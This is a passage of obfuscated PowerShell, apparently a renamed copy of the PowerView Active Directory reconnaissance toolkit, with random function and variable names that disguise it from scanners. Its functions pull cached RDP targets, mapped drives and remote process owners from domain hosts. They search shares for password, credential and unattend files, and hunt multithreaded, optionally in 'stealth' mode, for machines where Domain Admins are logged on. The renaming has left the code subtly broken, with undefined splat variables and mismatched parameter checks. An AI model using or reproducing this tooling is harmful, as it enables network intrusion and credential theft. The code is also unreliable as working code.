                $Key = 'SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\LogonUI'
                $Value = 'LastLoggedOnUser'
                $xThkOEFt99 = $Reg.GetStringValue($HKLM, $Key, $Value).sValue

                $ycoPPujE99 = New-Object PSObject
                $ycoPPujE99 | Add-Member Noteproperty 'ComputerName' $BoJggNks99
                $ycoPPujE99 | Add-Member Noteproperty 'LastLoggedOn' $xThkOEFt99
                $ycoPPujE99.PSObject.TypeNames.Insert(0, 'PowerView.LastLoggedOnUser')
                $ycoPPujE99
            }
            catch {
                Write-Warning "[straightest] Error opening remote registry on $BoJggNks99. Remote registry likely not enabled."
            }
        }
    }
}


function scabbier {

    [OutputType('PowerView.CachedRDPConnection')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $tdrFALUN99 = 'localhost',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $tYWiEqAT99 = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        ForEach ($BoJggNks99 in $tdrFALUN99) {
            $HKU = 2147483651

            $oKMRUpSN99 = @{
                'List' = $True
                'Class' = 'StdRegProv'
                'Namespace' = 'root\default'
                'Computername' = $BoJggNks99
                'ErrorAction' = 'Stop'
            }
            if ($PSBoundParameters['Credential']) { $oKMRUpSN99['Credential'] = $tYWiEqAT99 }

            try {
                $Reg = Get-WmiObject @WmiArguments

                $cVtbzkZa99 = ($Reg.EnumKey($HKU, '')).sNames | Where-Object { $_ -match 'S-1-5-21-[0-9]+-[0-9]+-[0-9]+-[0-9]+$' }

                ForEach ($zUavgesH99 in $cVtbzkZa99) {
                    try {
                        if ($PSBoundParameters['Credential']) {
                            $OvZZajfU99 = recollection -ObjectSid $zUavgesH99 -Credential $tYWiEqAT99
                        }
                        else {
                            $OvZZajfU99 = recollection -ObjectSid $zUavgesH99
                        }

                        $jGvIPBHj99 = $Reg.EnumValues($HKU,"$zUavgesH99\Software\Microsoft\Terminal Server Client\Default").sNames

                        ForEach ($uYVZvkKC99 in $jGvIPBHj99) {
                            if ($uYVZvkKC99 -match 'MRU.*') {
                                $OMvKerXm99 = $Reg.GetStringValue($HKU, "$zUavgesH99\Software\Microsoft\Terminal Server Client\Default", $uYVZvkKC99).sValue

                                $VikTssHX99 = New-Object PSObject
                                $VikTssHX99 | Add-Member Noteproperty 'ComputerName' $BoJggNks99
                                $VikTssHX99 | Add-Member Noteproperty 'UserName' $OvZZajfU99
                                $VikTssHX99 | Add-Member Noteproperty 'UserSID' $zUavgesH99
                                $VikTssHX99 | Add-Member Noteproperty 'TargetServer' $OMvKerXm99
                                $VikTssHX99 | Add-Member Noteproperty 'UsernameHint' $Null
                                $VikTssHX99.PSObject.TypeNames.Insert(0, 'PowerView.CachedRDPConnection')
                                $VikTssHX99
                            }
                        }

                        $YaWDMfFL99 = $Reg.EnumKey($HKU,"$zUavgesH99\Software\Microsoft\Terminal Server Client\Servers").sNames

                        ForEach ($tqOJuvTN99 in $YaWDMfFL99) {

                            $LBlftWwl99 = $Reg.GetStringValue($HKU, "$zUavgesH99\Software\Microsoft\Terminal Server Client\Servers\$tqOJuvTN99", 'UsernameHint').sValue

                            $VikTssHX99 = New-Object PSObject
                            $VikTssHX99 | Add-Member Noteproperty 'ComputerName' $BoJggNks99
                            $VikTssHX99 | Add-Member Noteproperty 'UserName' $OvZZajfU99
                            $VikTssHX99 | Add-Member Noteproperty 'UserSID' $zUavgesH99
                            $VikTssHX99 | Add-Member Noteproperty 'TargetServer' $tqOJuvTN99
                            $VikTssHX99 | Add-Member Noteproperty 'UsernameHint' $LBlftWwl99
                            $VikTssHX99.PSObject.TypeNames.Insert(0, 'PowerView.CachedRDPConnection')
                            $VikTssHX99
                        }
                    }
                    catch {
                        Write-Verbose "[scabbier] Error: $_"
                    }
                }
            }
            catch {
                Write-Warning "[scabbier] Error accessing $BoJggNks99, likely insufficient permissions or firewall rules on host: $_"
            }
        }
    }
}


function Linux {

    [OutputType('PowerView.RegMountedDrive')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $tdrFALUN99 = 'localhost',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $tYWiEqAT99 = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        ForEach ($BoJggNks99 in $tdrFALUN99) {
            $HKU = 2147483651

            $oKMRUpSN99 = @{
                'List' = $True
                'Class' = 'StdRegProv'
                'Namespace' = 'root\default'
                'Computername' = $BoJggNks99
                'ErrorAction' = 'Stop'
            }
            if ($PSBoundParameters['Credential']) { $oKMRUpSN99['Credential'] = $tYWiEqAT99 }

            try {
                $Reg = Get-WmiObject @WmiArguments

                $cVtbzkZa99 = ($Reg.EnumKey($HKU, '')).sNames | Where-Object { $_ -match 'S-1-5-21-[0-9]+-[0-9]+-[0-9]+-[0-9]+$' }

                ForEach ($zUavgesH99 in $cVtbzkZa99) {
                    try {
                        if ($PSBoundParameters['Credential']) {
                            $OvZZajfU99 = recollection -ObjectSid $zUavgesH99 -Credential $tYWiEqAT99
                        }
                        else {
                            $OvZZajfU99 = recollection -ObjectSid $zUavgesH99
                        }

                        $ihlZDhjx99 = ($Reg.EnumKey($HKU, "$zUavgesH99\Network")).sNames

                        ForEach ($YmFGydpQ99 in $ihlZDhjx99) {
                            $maOMsVvV99 = $Reg.GetStringValue($HKU, "$zUavgesH99\Network\$YmFGydpQ99", 'ProviderName').sValue
                            $bVlQRNEV99 = $Reg.GetStringValue($HKU, "$zUavgesH99\Network\$YmFGydpQ99", 'RemotePath').sValue
                            $qcavmFlQ99 = $Reg.GetStringValue($HKU, "$zUavgesH99\Network\$YmFGydpQ99", 'UserName').sValue
                            if (-not $OvZZajfU99) { $OvZZajfU99 = '' }

                            if ($bVlQRNEV99 -and ($bVlQRNEV99 -ne '')) {
                                $tznWQxTG99 = New-Object PSObject
                                $tznWQxTG99 | Add-Member Noteproperty 'ComputerName' $BoJggNks99
                                $tznWQxTG99 | Add-Member Noteproperty 'UserName' $OvZZajfU99
                                $tznWQxTG99 | Add-Member Noteproperty 'UserSID' $zUavgesH99
                                $tznWQxTG99 | Add-Member Noteproperty 'DriveLetter' $YmFGydpQ99
                                $tznWQxTG99 | Add-Member Noteproperty 'ProviderName' $maOMsVvV99
                                $tznWQxTG99 | Add-Member Noteproperty 'RemotePath' $bVlQRNEV99
                                $tznWQxTG99 | Add-Member Noteproperty 'DriveUserName' $qcavmFlQ99
                                $tznWQxTG99.PSObject.TypeNames.Insert(0, 'PowerView.RegMountedDrive')
                                $tznWQxTG99
                            }
                        }
                    }
                    catch {
                        Write-Verbose "[Linux] Error: $_"
                    }
                }
            }
            catch {
                Write-Warning "[Linux] Error accessing $BoJggNks99, likely insufficient permissions or firewall rules on host: $_"
            }
        }
    }
}


function intake {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.UserProcess')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $tdrFALUN99 = 'localhost',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $tYWiEqAT99 = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        ForEach ($BoJggNks99 in $tdrFALUN99) {
            try {
                $oKMRUpSN99 = @{
                    'ComputerName' = $tdrFALUN99
                    'Class' = 'Win32_process'
                }
                if ($PSBoundParameters['Credential']) { $oKMRUpSN99['Credential'] = $tYWiEqAT99 }
                Get-WMIobject @WmiArguments | ForEach-Object {
                    $Owner = $_.getowner();
                    $DYlYhKHG99 = New-Object PSObject
                    $DYlYhKHG99 | Add-Member Noteproperty 'ComputerName' $BoJggNks99
                    $DYlYhKHG99 | Add-Member Noteproperty 'ProcessName' $_.ProcessName
                    $DYlYhKHG99 | Add-Member Noteproperty 'ProcessID' $_.ProcessID
                    $DYlYhKHG99 | Add-Member Noteproperty 'Domain' $Owner.Domain
                    $DYlYhKHG99 | Add-Member Noteproperty 'User' $Owner.User
                    $DYlYhKHG99.PSObject.TypeNames.Insert(0, 'PowerView.UserProcess')
                    $DYlYhKHG99
                }
            }
            catch {
                Write-Verbose "[intake] Error enumerating remote processes on '$BoJggNks99', access likely denied: $_"
            }
        }
    }
}


function fulfillment {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.FoundFile')]
    [CmdletBinding(DefaultParameterSetName = 'FileSpecification')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Path = '.\',

        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [Alias('SearchTerms', 'Terms')]
        [String[]]
        $UwujJppc99 = @('*password*', '*sensitive*', '*admin*', '*login*', '*secret*', 'unattend*.xml', '*.vmdk', '*creds*', '*credential*', '*.config'),

        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $BRTLfNAI99,

        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $mIkZSmpB99,

        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $SgMJBQWw99,

        [Parameter(ParameterSetName = 'OfficeDocs')]
        [Switch]
        $GIZwMJgs99,

        [Parameter(ParameterSetName = 'FreshEXEs')]
        [Switch]
        $niFAVTYC99,

        [Parameter(ParameterSetName = 'FileSpecification')]
        [Switch]
        $cviZnUqu99,

        [Parameter(ParameterSetName = 'FileSpecification')]
        [Switch]
        $bhoFrHTN99,

        [Switch]
        $InWlhoZx99,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $tYWiEqAT99 = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $nlvvSWoK99 =  @{
            'Recurse' = $True
            'ErrorAction' = 'SilentlyContinue'
            'Include' = $UwujJppc99
        }
        if ($PSBoundParameters['OfficeDocs']) {
            $nlvvSWoK99['Include'] = @('*.doc', '*.docx', '*.xls', '*.xlsx', '*.ppt', '*.pptx')
        }
        elseif ($PSBoundParameters['FreshEXEs']) {
            $BRTLfNAI99 = (Get-Date).AddDays(-7).ToString('MM/dd/yyyy')
            $nlvvSWoK99['Include'] = @('*.exe')
        }
        $nlvvSWoK99['Force'] = -not $PSBoundParameters['ExcludeHidden']

        $cdhpdjRy99 = @{}

        function inextinguishable {
            [CmdletBinding()]Param([String]$Path)
            try {
                $KLjGoHZv99 = [IO.File]::OpenWrite($Path)
                $KLjGoHZv99.Close()
                $True
            }
            catch {
                $False
            }
        }
    }

    PROCESS {
        ForEach ($HopMlfhE99 in $Path) {
            if (($HopMlfhE99 -Match '\\\\.*\\.*') -and ($PSBoundParameters['Credential'])) {
                $PYpySBmA99 = (New-Object System.Uri($HopMlfhE99)).Host
                if (-not $cdhpdjRy99[$PYpySBmA99]) {
                    Kamehameha -ComputerName $PYpySBmA99 -Credential $tYWiEqAT99
                    $cdhpdjRy99[$PYpySBmA99] = $True
                }
            }

            $nlvvSWoK99['Path'] = $HopMlfhE99
            Get-ChildItem @SearcherArguments | ForEach-Object {
                $gspZxqRT99 = $True
                if ($PSBoundParameters['ExcludeFolders'] -and ($_.PSIsContainer)) {
                    Write-Verbose "Excluding: $($_.FullName)"
                    $gspZxqRT99 = $False
                }
                if ($BRTLfNAI99 -and ($_.LastAccessTime -lt $BRTLfNAI99)) {
                    $gspZxqRT99 = $False
                }
                if ($PSBoundParameters['LastWriteTime'] -and ($_.LastWriteTime -lt $mIkZSmpB99)) {
                    $gspZxqRT99 = $False
                }
                if ($PSBoundParameters['CreationTime'] -and ($_.CreationTime -lt $SgMJBQWw99)) {
                    $gspZxqRT99 = $False
                }
                if ($PSBoundParameters['CheckWriteAccess'] -and (-not (inextinguishable -Path $_.FullName))) {
                    $gspZxqRT99 = $False
                }
                if ($gspZxqRT99) {
                    $HbDYgtOE99 = @{
                        'Path' = $_.FullName
                        'Owner' = $((Get-Acl $_.FullName).Owner)
                        'LastAccessTime' = $_.LastAccessTime
                        'LastWriteTime' = $_.LastWriteTime
                        'CreationTime' = $_.CreationTime
                        'Length' = $_.Length
                    }
                    $ygpGWQzW99 = New-Object -TypeName PSObject -Property $HbDYgtOE99
                    $ygpGWQzW99.PSObject.TypeNames.Insert(0, 'PowerView.FoundFile')
                    $ygpGWQzW99
                }
            }
        }
    }

    END {
        $cdhpdjRy99.Keys | refrigerants
    }
}



function nighttime {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [String[]]
        $tdrFALUN99,

        [Parameter(Position = 1, Mandatory = $True)]
        [System.Management.Automation.ScriptBlock]
        $WaphoWBe99,

        [Parameter(Position = 2)]
        [Hashtable]
        $dFffHMvS99,

        [Int]
        [ValidateRange(1,  100)]
        $HTdoixhx99 = 20,

        [Switch]
        $cyzYEEjS99
    )

    BEGIN {
        $XBiLwMrq99 = [System.Management.Automation.Runspaces.InitialSessionState]::CreateDefault()

        $XBiLwMrq99.ApartmentState = [System.Threading.ApartmentState]::STA

        if (-not $cyzYEEjS99) {
            $cLSjGzfA99 = Get-Variable -Scope 2

            $ElTtQINY99 = @('?','args','ConsoleFileName','Error','ExecutionContext','false','HOME','Host','input','InputObject','MaximumAliasCount','MaximumDriveCount','MaximumErrorCount','MaximumFunctionCount','MaximumHistoryCount','MaximumVariableCount','MyInvocation','null','PID','PSBoundParameters','PSCommandPath','PSCulture','PSDefaultParameterValues','PSHOME','PSScriptRoot','PSUICulture','PSVersionTable','PWD','ShellId','SynchronizedHash','true')

            ForEach ($Var in $cLSjGzfA99) {
                if ($ElTtQINY99 -NotContains $Var.Name) {
                $XBiLwMrq99.Variables.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateVariableEntry -ArgumentList $Var.name,$Var.Value,$Var.description,$Var.options,$Var.attributes))
                }
            }

            ForEach ($TrMYDOZc99 in (Get-ChildItem Function:)) {
                $XBiLwMrq99.Commands.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateFunctionEntry -ArgumentList $TrMYDOZc99.Name, $TrMYDOZc99.Definition))
            }
        }


        $Pool = [RunspaceFactory]::CreateRunspacePool(1, $HTdoixhx99, $XBiLwMrq99, $Host)
        $Pool.Open()

        $BXxAvYPV99 = $Null
        ForEach ($M in [PowerShell].GetMethods() | Where-Object { $_.Name -eq 'BeginInvoke' }) {
            $BLhuobqz99 = $M.GetParameters()
            if (($BLhuobqz99.Count -eq 2) -and $BLhuobqz99[0].Name -eq 'input' -and $BLhuobqz99[1].Name -eq 'output') {
                $BXxAvYPV99 = $M.MakeGenericMethod([Object], [Object])
                break
            }
        }

        $Jobs = @()
        $tdrFALUN99 = $tdrFALUN99 | Where-Object {$_ -and $_.Trim()}
        Write-Verbose "[nighttime] Total number of hosts: $($tdrFALUN99.count)"

        if ($HTdoixhx99 -ge $tdrFALUN99.Length) {
            $HTdoixhx99 = $tdrFALUN99.Length
        }
        $eLBOYLKi99 = [Int]($tdrFALUN99.Length/$HTdoixhx99)
        $fynnXZpf99 = @()
        $Start = 0
        $End = $eLBOYLKi99

        for($i = 1; $i -le $HTdoixhx99; $i++) {
            $List = New-Object System.Collections.ArrayList
            if ($i -eq $HTdoixhx99) {
                $End = $tdrFALUN99.Length
            }
            $List.AddRange($tdrFALUN99[$Start..($End-1)])
            $Start += $eLBOYLKi99
            $End += $eLBOYLKi99
            $fynnXZpf99 += @(,@($List.ToArray()))
        }

        Write-Verbose "[nighttime] Total number of threads/partitions: $HTdoixhx99"

        ForEach ($NAodfaiz99 in $fynnXZpf99) {
            $ytBhgKsR99 = [PowerShell]::Create()
            $ytBhgKsR99.runspacepool = $Pool

            $Null = $ytBhgKsR99.AddScript($WaphoWBe99).AddParameter('ComputerName', $NAodfaiz99)
            if ($dFffHMvS99) {
                ForEach ($Param in $dFffHMvS99.GetEnumerator()) {
                    $Null = $ytBhgKsR99.AddParameter($Param.Name, $Param.Value)
                }
            }

            $MWaxCMux99 = New-Object Management.Automation.PSDataCollection[Object]

            $Jobs += @{
                PS = $ytBhgKsR99
                Output = $MWaxCMux99
                Result = $BXxAvYPV99.Invoke($ytBhgKsR99, @($Null, [Management.Automation.PSDataCollection[Object]]$MWaxCMux99))
            }
        }
    }

    END {
        Write-Verbose "[nighttime] Threads executing"

        Do {
            ForEach ($Job in $Jobs) {
                $Job.Output.ReadAll()
            }
            Start-Sleep -Seconds 1
        }
        While (($Jobs | Where-Object { -not $_.Result.IsCompleted }).Count -gt 0)

        $wlCSjTaL99 = 100
        Write-Verbose "[nighttime] Waiting $wlCSjTaL99 seconds for final cleanup..."

        for ($i=0; $i -lt $wlCSjTaL99; $i++) {
            ForEach ($Job in $Jobs) {
                $Job.Output.ReadAll()
                $Job.PS.Dispose()
            }
            Start-Sleep -S 1
        }

        $Pool.Dispose()
        Write-Verbose "[nighttime] all threads completed"
    }
}


function residential {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.UserLocation')]
    [CmdletBinding(DefaultParameterSetName = 'UserGroupIdentity')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DNSHostName')]
        [String[]]
        $tdrFALUN99,

        [ValidateNotNullOrEmpty()]
        [String]
        $JXWXuoyG99,

        [ValidateNotNullOrEmpty()]
        [String]
        $PoXGVGfN99,

        [ValidateNotNullOrEmpty()]
        [String]
        $oGyOVIvJ99,

        [ValidateNotNullOrEmpty()]
        [String]
        $ocbESvDy99,

        [Alias('Unconstrained')]
        [Switch]
        $eZtvAJPm99,

        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        $ZusWAspj99,

        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        $WXClDdmq99,

        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        $PsJJAxFX99,

        [Parameter(ParameterSetName = 'UserIdentity')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $CgAKgSWG99,

        [ValidateNotNullOrEmpty()]
        [String]
        $thGIxDFy99,

        [ValidateNotNullOrEmpty()]
        [String]
        $nSeBUOKk99,

        [ValidateNotNullOrEmpty()]
        [String]
        $NZDWwSev99,

        [Parameter(ParameterSetName = 'UserGroupIdentity')]
        [ValidateNotNullOrEmpty()]
        [Alias('GroupName', 'Group')]
        [String[]]
        $ZIIeJpKb99 = 'Domain Admins',

        [Alias('AdminCount')]
        [Switch]
        $hXfOdLeR99,

        [Alias('AllowDelegation')]
        [Switch]
        $bkEFTZGQ99,

        [Switch]
        $eZZeCTaU99,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $tqOJuvTN99,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $lGlQEcNF99 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ixOvvLXO99 = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $EQlXfKFO99,

        [Switch]
        $adpABMuf99,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $tYWiEqAT99 = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $TSkCgmBs99,

        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        $gIOVyqMv99 = .3,

        [Parameter(ParameterSetName = 'ShowAll')]
        [Switch]
        $opOaaNEv99,

        [Switch]
        $gGpvysda99,

        [String]
        [ValidateSet('DFS', 'DC', 'File', 'All')]
        $TZReEsFy99 = 'All',

        [Int]
        [ValidateRange(1, 100)]
        $HTdoixhx99 = 20
    )

    BEGIN {

        $BNZinIaQ99 = @{
            'Properties' = 'dnshostname'
        }
        if ($PSBoundParameters['Domain']) { $BNZinIaQ99['Domain'] = $JXWXuoyG99 }
        if ($PSBoundParameters['ComputerDomain']) { $BNZinIaQ99['Domain'] = $PoXGVGfN99 }
        if ($PSBoundParameters['ComputerLDAPFilter']) { $BNZinIaQ99['LDAPFilter'] = $oGyOVIvJ99 }
        if ($PSBoundParameters['ComputerSearchBase']) { $BNZinIaQ99['SearchBase'] = $ocbESvDy99 }
        if ($PSBoundParameters['Unconstrained']) { $BNZinIaQ99['Unconstrained'] = $eWrtIVpV99 }
        if ($PSBoundParameters['ComputerOperatingSystem']) { $BNZinIaQ99['OperatingSystem'] = $kOjIFfIK99 }
        if ($PSBoundParameters['ComputerServicePack']) { $BNZinIaQ99['ServicePack'] = $iZbiKaWr99 }
        if ($PSBoundParameters['ComputerSiteName']) { $BNZinIaQ99['SiteName'] = $UHxOuyqA99 }
        if ($PSBoundParameters['Server']) { $BNZinIaQ99['Server'] = $tqOJuvTN99 }
        if ($PSBoundParameters['SearchScope']) { $BNZinIaQ99['SearchScope'] = $lGlQEcNF99 }
        if ($PSBoundParameters['ResultPageSize']) { $BNZinIaQ99['ResultPageSize'] = $ixOvvLXO99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $BNZinIaQ99['ServerTimeLimit'] = $EQlXfKFO99 }
        if ($PSBoundParameters['Tombstone']) { $BNZinIaQ99['Tombstone'] = $adpABMuf99 }
        if ($PSBoundParameters['Credential']) { $BNZinIaQ99['Credential'] = $tYWiEqAT99 }

        $HYrlZdwg99 = @{
            'Properties' = 'samaccountname'
        }
        if ($PSBoundParameters['UserIdentity']) { $HYrlZdwg99['Identity'] = $CgAKgSWG99 }
        if ($PSBoundParameters['Domain']) { $HYrlZdwg99['Domain'] = $JXWXuoyG99 }
        if ($PSBoundParameters['UserDomain']) { $HYrlZdwg99['Domain'] = $thGIxDFy99 }
        if ($PSBoundParameters['UserLDAPFilter']) { $HYrlZdwg99['LDAPFilter'] = $nSeBUOKk99 }
        if ($PSBoundParameters['UserSearchBase']) { $HYrlZdwg99['SearchBase'] = $NZDWwSev99 }
        if ($PSBoundParameters['UserAdminCount']) { $HYrlZdwg99['AdminCount'] = $hXfOdLeR99 }
        if ($PSBoundParameters['UserAllowDelegation']) { $HYrlZdwg99['AllowDelegation'] = $bkEFTZGQ99 }
        if ($PSBoundParameters['Server']) { $HYrlZdwg99['Server'] = $tqOJuvTN99 }
        if ($PSBoundParameters['SearchScope']) { $HYrlZdwg99['SearchScope'] = $lGlQEcNF99 }
        if ($PSBoundParameters['ResultPageSize']) { $HYrlZdwg99['ResultPageSize'] = $ixOvvLXO99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $HYrlZdwg99['ServerTimeLimit'] = $EQlXfKFO99 }
        if ($PSBoundParameters['Tombstone']) { $HYrlZdwg99['Tombstone'] = $adpABMuf99 }
        if ($PSBoundParameters['Credential']) { $HYrlZdwg99['Credential'] = $tYWiEqAT99 }

        $ZCKwKoiv99 = @()

        if ($PSBoundParameters['ComputerName']) {
            $ZCKwKoiv99 = @($tdrFALUN99)
        }
        else {
            if ($PSBoundParameters['Stealth']) {
                Write-Verbose "[residential] Stealth enumeration using source: $TZReEsFy99"
                $dlUZzYms99 = New-Object System.Collections.ArrayList

                if ($TZReEsFy99 -match 'File|All') {
                    Write-Verbose '[residential] Querying for file servers'
                    $zqZXXJld99 = @{}
                    if ($PSBoundParameters['Domain']) { $zqZXXJld99['Domain'] = $JXWXuoyG99 }
                    if ($PSBoundParameters['ComputerDomain']) { $zqZXXJld99['Domain'] = $PoXGVGfN99 }
                    if ($PSBoundParameters['ComputerSearchBase']) { $zqZXXJld99['SearchBase'] = $ocbESvDy99 }
                    if ($PSBoundParameters['Server']) { $zqZXXJld99['Server'] = $tqOJuvTN99 }
                    if ($PSBoundParameters['SearchScope']) { $zqZXXJld99['SearchScope'] = $lGlQEcNF99 }
                    if ($PSBoundParameters['ResultPageSize']) { $zqZXXJld99['ResultPageSize'] = $ixOvvLXO99 }
                    if ($PSBoundParameters['ServerTimeLimit']) { $zqZXXJld99['ServerTimeLimit'] = $EQlXfKFO99 }
                    if ($PSBoundParameters['Tombstone']) { $zqZXXJld99['Tombstone'] = $adpABMuf99 }
                    if ($PSBoundParameters['Credential']) { $zqZXXJld99['Credential'] = $tYWiEqAT99 }
                    $SbkMQQaN99 = BSD @FileServerSearcherArguments
                    if ($SbkMQQaN99 -isnot [System.Array]) { $SbkMQQaN99 = @($SbkMQQaN99) }
                    $dlUZzYms99.AddRange( $SbkMQQaN99 )
                }
                if ($TZReEsFy99 -match 'DFS|All') {
                    Write-Verbose '[residential] Querying for DFS servers'
                }
                if ($TZReEsFy99 -match 'DC|All') {
                    Write-Verbose '[residential] Querying for domain controllers'
                    $cNKzIqTH99 = @{
                        'LDAP' = $True
                    }
                    if ($PSBoundParameters['Domain']) { $cNKzIqTH99['Domain'] = $JXWXuoyG99 }
                    if ($PSBoundParameters['ComputerDomain']) { $cNKzIqTH99['Domain'] = $PoXGVGfN99 }
                    if ($PSBoundParameters['Server']) { $cNKzIqTH99['Server'] = $tqOJuvTN99 }
                    if ($PSBoundParameters['Credential']) { $cNKzIqTH99['Credential'] = $tYWiEqAT99 }
                    $KvfxzhSQ99 = militarist @DCSearcherArguments | Select-Object -ExpandProperty dnshostname
                    if ($KvfxzhSQ99 -isnot [System.Array]) { $KvfxzhSQ99 = @($KvfxzhSQ99) }
                    $dlUZzYms99.AddRange( $KvfxzhSQ99 )
                }
                $ZCKwKoiv99 = $dlUZzYms99.ToArray()
            }
            else {
                Write-Verbose '[residential] Querying for all computers in the domain'
                $ZCKwKoiv99 = undergrad @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
            }
        }
        Write-Verbose "[residential] TargetComputers length: $($ZCKwKoiv99.Length)"
        if ($ZCKwKoiv99.Length -eq 0) {
            throw '[residential] No hosts found to enumerate'
        }

        if ($PSBoundParameters['Credential']) {
            $NSfWjkcR99 = $tYWiEqAT99.GetNetworkCredential().UserName
        }
        else {
            $NSfWjkcR99 = ([Environment]::UserName).ToLower()
        }

        if ($PSBoundParameters['ShowAll']) {
            $wlXzrlmQ99 = @()
        }
        elseif ($PSBoundParameters['UserIdentity'] -or $PSBoundParameters['UserLDAPFilter'] -or $PSBoundParameters['UserSearchBase'] -or $PSBoundParameters['UserAdminCount'] -or $PSBoundParameters['UserAllowDelegation']) {
            $wlXzrlmQ99 = asseverate @UserSearcherArguments | Select-Object -ExpandProperty samaccountname
        }
        else {
            $fruBZLAG99 = @{
                'Identity' = $ZIIeJpKb99
                'Recurse' = $True
            }
            if ($PSBoundParameters['UserDomain']) { $fruBZLAG99['Domain'] = $thGIxDFy99 }
            if ($PSBoundParameters['UserSearchBase']) { $fruBZLAG99['SearchBase'] = $NZDWwSev99 }
            if ($PSBoundParameters['Server']) { $fruBZLAG99['Server'] = $tqOJuvTN99 }
            if ($PSBoundParameters['SearchScope']) { $fruBZLAG99['SearchScope'] = $lGlQEcNF99 }
            if ($PSBoundParameters['ResultPageSize']) { $fruBZLAG99['ResultPageSize'] = $ixOvvLXO99 }
            if ($PSBoundParameters['ServerTimeLimit']) { $fruBZLAG99['ServerTimeLimit'] = $EQlXfKFO99 }
            if ($PSBoundParameters['Tombstone']) { $fruBZLAG99['Tombstone'] = $adpABMuf99 }
            if ($PSBoundParameters['Credential']) { $fruBZLAG99['Credential'] = $tYWiEqAT99 }
            $wlXzrlmQ99 = deleted @GroupSearcherArguments | Select-Object -ExpandProperty MemberName
        }

        Write-Verbose "[residential] TargetUsers length: $($wlXzrlmQ99.Length)"
        if ((-not $opOaaNEv99) -and ($wlXzrlmQ99.Length -eq 0)) {
            throw '[residential] No users found to target'
        }

        $BJtVKDHD99 = {
            Param($tdrFALUN99, $wlXzrlmQ99, $NSfWjkcR99, $gGpvysda99, $ZDPszabE99)

            if ($ZDPszabE99) {
                $Null = privets -TokenHandle $ZDPszabE99 -Quiet
            }

            ForEach ($KoSdeYaT99 in $tdrFALUN99) {
                $Up = Test-Connection -Count 1 -Quiet -ComputerName $KoSdeYaT99
                if ($Up) {
                    $TPmxRiSf99 = Letha -ComputerName $KoSdeYaT99
                    ForEach ($YbCYQFsZ99 in $TPmxRiSf99) {
                        $OvZZajfU99 = $YbCYQFsZ99.UserName
                        $CName = $YbCYQFsZ99.CName

                        if ($CName -and $CName.StartsWith('\\')) {
                            $CName = $CName.TrimStart('\')
                        }

                        if (($OvZZajfU99) -and ($OvZZajfU99.Trim() -ne '') -and ($OvZZajfU99 -notmatch $NSfWjkcR99) -and ($OvZZajfU99 -notmatch '\$$')) {

                            if ( (-not $wlXzrlmQ99) -or ($wlXzrlmQ99 -contains $OvZZajfU99)) {
                                $KmhpOqzu99 = New-Object PSObject
                                $KmhpOqzu99 | Add-Member Noteproperty 'UserDomain' $Null
                                $KmhpOqzu99 | Add-Member Noteproperty 'UserName' $OvZZajfU99
                                $KmhpOqzu99 | Add-Member Noteproperty 'ComputerName' $KoSdeYaT99
                                $KmhpOqzu99 | Add-Member Noteproperty 'SessionFrom' $CName

                                try {
                                    $OBrABBhI99 = [System.Net.Dns]::GetHostEntry($CName) | Select-Object -ExpandProperty HostName
